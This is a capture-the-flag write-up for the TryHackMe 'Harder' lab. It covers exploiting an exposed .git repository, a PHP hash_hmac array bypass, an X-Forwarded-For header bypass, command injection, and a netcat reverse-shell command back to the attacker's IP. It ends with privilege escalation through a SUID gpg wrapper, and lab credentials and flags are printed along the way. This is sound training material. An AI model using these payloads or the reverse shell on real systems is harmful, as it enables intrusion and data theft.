# 43 - Harder

Room Link --> [https://tryhackme.com/room/harder](https://tryhackme.com/room/harder)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.69.73 -sV -p-

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
```
{% endcode %}

Webpage displayed a 404 error on the page, so i used burpsuite and on the response header i  saw a "Set-Cookie" value:

<figure><img src=".gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

So i added the domain to my `/etc/hosts` file. And got on this page.

<figure><img src=".gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

So we need creedentials now :(

#### Gobuster Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://pwd.harder.local -w /usr/share/dirb/wordlists/common.txt -t 500 --no-error -b 404,404,500,403,502 -x txt,php,db,sql,html

/.git/HEAD
/auth.php
/index.php
/index.php
/secret.php
```
{% endcode %}

Navigating to `pwd.harder.local/.git/HEAD` - downloaded a git HEAD file.

#### Git Enumeration

Since there is a `.git` dir on the website, we can use [GitTools](https://github.com/internetwache/GitTools) to enumerate the dir.

```bash
/opt/GitTools/Dumper/gitdumper.sh http://pwd.harder.local/.git/ git
```

<figure><img src=".gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

We run `git log` - to view all the commits.

{% code overflow="wrap" %}
```bash
┌──(dking㉿dking)-[~/Downloads/git/.git]
└─$ git log
commit 9399abe877c92db19e7fc122d2879b470d7d6a58 (HEAD -> master)
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 18:12:23 2019 +0300

    add gitignore

commit 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 18:11:32 2019 +0300

    add extra security

commit ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3
Author: evs <evs@harder.htb>
Date:   Thu Oct 3 14:00:52 2019 +0300

    added index.php
```
{% endcode %}

In order to get all the files in the previous commits;

```bash
┌──(dking㉿dking)-[~/Downloads/git]
└─$ git checkout .
Updated 4 paths from the index

┌──(dking㉿dking)-[~/Downloads/git]
└─$ ls -al
total 48
drwxr-xr-x 3 dking dking  4096 Oct 28 15:26 .
drwxr-xr-x 3 dking dking  4096 Oct 28 15:08 ..
-rw-r--r-- 1 dking dking 23820 Oct 28 15:26 auth.php
drwxr-xr-x 6 dking dking  4096 Oct 28 15:26 .git
-rw-r--r-- 1 dking dking    27 Oct 28 15:26 .gitignore
-rw-r--r-- 1 dking dking   431 Oct 28 15:26 hmac.php
-rw-r--r-- 1 dking dking   608 Oct 28 15:26 index.php
```

We got some new files here. Checking them out.

So there is credentials.php file in the server and we need to access it to gain more access.

Contents of **index.php**

{% code overflow="wrap" lineNumbers="true" %}
```php
<?php
  session_start();
  require("auth.php");
  $login = new Login;
  $login->authorize();
  require("hmac.php");
  require("credentials.php");
?> 
  <table style="border: 1px solid;">
     <tr>
       <td style="border: 1px solid;">url</td>
       <td style="border: 1px solid;">username</td>
       <td style="border: 1px solid;">password (cleartext)</td>
     </tr>
     <tr>
       <td style="border: 1px solid;"><?php echo $creds[0]; ?></td>
       <td style="border: 1px solid;"><?php echo $creds[1]; ?></td>
       <td style="border: 1px solid;"><?php echo $creds[2]; ?></td>
     </tr>
   </table>
```
{% endcode %}

Here it includes auth, calls the authorize method in Login class, and includes hmac and credentials. At last, it prints the $creds array’s content.

If you look into the auth.php file, it does not do much. It has a login class with authorize method. Authorize method checks if the cookies are set or not and if the cookies match the credentials, then the user stays logged in or is logged out. So if we use admin: admin creds we are logged in.

Now it includes hmac.php

{% code overflow="wrap" lineNumbers="true" %}
```php
<?php
if (empty($_GET['h']) || empty($_GET['host'])) {
   header('HTTP/1.0 400 Bad Request');
   print("missing get parameter");
   die();
}
require("secret.php"); //set $secret var
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
?>
```
{% endcode %}

If we look at the headers after logging in we saw 400 Bad Request. Sow this must be running and we didn't set the **h** and **host** parameter.

```
if (isset($_GET['n'])) {
   $secret = hash_hmac('sha256', $_GET['n'], $secret);
}
$hm = hash_hmac('sha256', $_GET['host'], $secret);
if ($hm !== $_GET['h']){
  header('HTTP/1.0 403 Forbidden');
  print("extra security check failed");
  die();
}
```

If **n** is set then it creates sha256 hash with data **n** and secret $secret ($secret is defined in secrets.php which we don’t have access to) and assigns to variable $secret. This $secret is again used as secret key with data from **host** parameter to create a sha256 hash which is assigned to $hm. If that is equal to **h** get parameter then we can get further.

Since we don't have access to $secret value so we need to bypass this. [This](https://www.securify.nl/blog/SFY20180101/spot-the-bug-challenge-2018-warm-up.html) article has information on how to bypass the check.

Following the article, if an array is passed as parameter **n** then the hmac function becomes

```
$secret = hash_hmac('sha256',Array(),$secret)
# It expects string but array is given so it gives a warning and returns false
```

Now `$secret` becomes false then the third parameter becomes false and we can generate hmac hash of any text and get further.

```
# lets use "dking"
hash_hmac('sha256', 'dking', false)

# run on cyberchef.
```

<figure><img src=".gitbook/assets/image (304).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# result is:
882f9b031450280f50303d643857a3dec3bc9b45efd6587413569542c0e317ad
```
{% endcode %}

#### Our payload now is:&#x20;

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://pwd.harder.local/index.php?n[]=&host=dking&h=882f9b031450280f50303d643857a3dec3bc9b45efd6587413569542c0e317ad
```
{% endcode %}

And we get this output:

<figure><img src=".gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# new virtual host.
http://shell.harder.local

# new creds.
evs : 9FRe8VUuhFhd3GyAtjxWn0e9RfSGv7xm
```
{% endcode %}

We get a new virtual host, lets add to `/etc/hosts` .

<figure><img src=".gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

We use the new credentials, and it worked.

<figure><img src=".gitbook/assets/image (307).png" alt=""><figcaption></figcaption></figure>

So now we need to bypass this. In order to bypass this, we need to set the `X-Forwarded-For` header and set its value to `10.10.10.0/24` .

<figure><img src=".gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

And we get a Command Injection page.

<figure><img src=".gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

View the `/etc/passwd` file.

<figure><img src=".gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

We can easily use Curl instead:

{% code overflow="wrap" lineNumbers="true" %}
```bash
┌──(dking㉿dking)-[~/Downloads/git]
└─$ curl -s -X POST http://shell.harder.local/index.php -H 'X-Forwarded-For: 10.10.10.20' -H 'Cookie: PHPSESSID=gm2h9n2o2m0epf2pcsnp6ibhau' --data 'cmd=ls -al' | html2text



***** Execute a command *****
Command [ls -al              ]
Execute
***** Output *****
total 48
drwxr-xr-x    1 www      www           4096 Oct  3  2019 .
drwxr-xr-x    1 www      www           4096 Jul  7  2020 ..
-rw-r--r--    1 www      www          23838 Oct  3  2019 auth.php
-rw-r--r--    1 www      www           2014 Oct  3  2019 index.php
-rw-r--r--    1 www      www            275 Oct  3  2019 ip.php
drwxr-xr-x    4 www      www           4096 Oct  3  2019 vendor
```
{% endcode %}

### Reverse Shell Access

{% code overflow="wrap" lineNumbers="true" %}
```bash
curl -s -X POST http://shell.harder.local/index.php -H 'X-Forwarded-For: 10.10.10.20' -H 'Cookie: PHPSESSID=i8pnq0mrhmi2u9ulortl7hbnvm' --data 'cmd=nc 10.18.88.214 1234 -e /bin/sh' | html2text

# ready nc listener.
```
{% endcode %}

And I got shell. Though the availabe shell/configured shell for all the users is `/bin/ash` - so `bash or sh` will not work.

<figure><img src=".gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>

So i uploaded `linPEAS` and used it to check for any escalation vectors, and found:

<figure><img src=".gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

There is a `/etc/periodic/15min/evs-backup.sh` file, owned by user `www` but in `/etc` directory.

<figure><img src=".gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

Contained ssh credentials for `evs` user.

`evs : U6j1brxGqbsUA$pMuIodnb$SZB4$bw14` .

And logged in via ssh

<figure><img src=".gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

Now we have a proper shell.

### Priv Esc

Finding SUID binaries

{% code overflow="wrap" lineNumbers="true" %}
```bash
find / -user root -perm /4000 -exec ls -l {} \; 2>/dev/null

/usr/local/bin/execute-crypted

# there is another file in the /usr/local/bin dir.
harder:/usr/local/bin$ ls
execute-crypted  run-crypted.sh
```
{% endcode %}

<figure><img src=".gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

Running the file and we see that the executable  is the compiled version of the `run-crypted.sh` file.&#x20;

The file only runs encrypted commands intended for `root@harder.local` using `gpg`.&#x20;

1st we need a ".gpg" key file, i sw one eariler when moving around the box at `/var/backup` .

Or we could find it using:

`find / -name "root@harder*" 2>/dev/null` .

save the command “whoami” to a file called command as suggested. Then the file needs to be encrypted with gpg and decrypted with execute-crypted.

> Use this [link ](https://www.networkworld.com/article/3293052/encypting-your-files-with-gpg.html)for gpg usage.\
>

#### Importing GPG key

{% code overflow="wrap" lineNumbers="true" %}
```
# we check if there are any keys imported already.
gpg --list-keys

# there are no keys, so we can import the one in /var/backup dir.
gpg --import /var/backup/root@harder.local.pub
```
{% endcode %}

<figure><img src=".gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

Just like the file usage instructions said:

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo -n '/root/root.txt' > /tmp/root
gpg --symmetric /tmp/root
# enter a new password for the file.

# then to decrypt the file, we use the "/usr/local/bin/execute-crypted"
harder:/usr/local/bin$ execute-crypted /tmp/root.gpg 
gpg: AES encrypted data
gpg: encrypted with 1 passphrase
/root/root.txt: line 1: 3a7bd72672889e0756b09f0566935a6c: not found

# and we got root.txt
3a7bd72672889e0756b09f0566935a6c
```
{% endcode %}











